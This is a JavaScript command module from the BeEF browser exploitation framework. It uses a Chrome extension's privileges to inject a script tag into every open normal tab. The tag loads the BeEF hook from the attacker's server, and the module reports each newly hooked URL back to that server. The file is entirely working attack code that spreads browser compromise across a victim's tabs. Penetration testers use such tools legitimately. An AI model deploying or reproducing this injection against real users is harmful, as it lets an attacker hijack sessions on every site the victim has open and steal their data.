//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
beef.execute(function() {

        var beefHookUri = "http://" + beef.net.host + ":" + beef.net.port + beef.net.hook;

        chrome.windows.getAll({"populate" : true}, function(windows) {
			for(i in windows) {
				if(windows[i].type=="normal") {
					chrome.tabs.getAllInWindow(windows[i].id,function(tabs){
						for(t in tabs) {
                            //antisnatchor: if the extension has her own tabs open, we want to precent injecting the hook
                            //also there. Chrome extensions with tabs and http/s permissions cannot access URIs with protocol
                            // handlers chrome-extension://, and most of them will not have permissions to do so.
                            if(tabs[t].url.substring(0,16) != "chrome-extension"){
                                chrome.tabs.executeScript(tabs[t].id,{code:"newScript=document.createElement('script'); newScript.src='"
                                    + beefHookUri + "'; newScript.setAttribute('onload','beef_init()'); document.getElementsByTagName('head')[0].appendChild(newScript);"})

						        //send back the new domain that will be hooked :-)
                                beef.net.send('<%= @command_url %>', <%= @command_id %>, 'Successfully injected BeEF hook on: ' + tabs[t].url);
                            }
						}
					})
				}
			}
		});
});

